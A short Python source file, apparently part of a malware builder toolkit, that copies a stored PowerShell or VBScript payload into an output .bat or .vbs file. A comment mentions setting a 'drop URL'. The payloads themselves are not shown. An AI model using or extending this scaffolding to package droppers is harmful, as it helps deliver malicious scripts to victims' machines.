
import os

class Build :

	def __init__(self, extension, filetype) :
		self.extension = extension
		self.filetype = filetype

	def builder(self) :

		path = "output/builds/" # Builds files

		if self.filetype == "bat":
			payloads = "data/payloads/powershell/powershell.txt" # Payload file
		elif self.filetype == "vbs" :
			payloads = "data/payloads/VBScript/vbs.txt" # Payload file
			
		build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
		
		try:
			with open(payloads, 'rb') as f :
				# Set the drop URL
				with open(os.path.join(path, build), 'wb') as builder :
					# Write the new file
					builder.write(f.read())
		except IOError as e:
			raise e

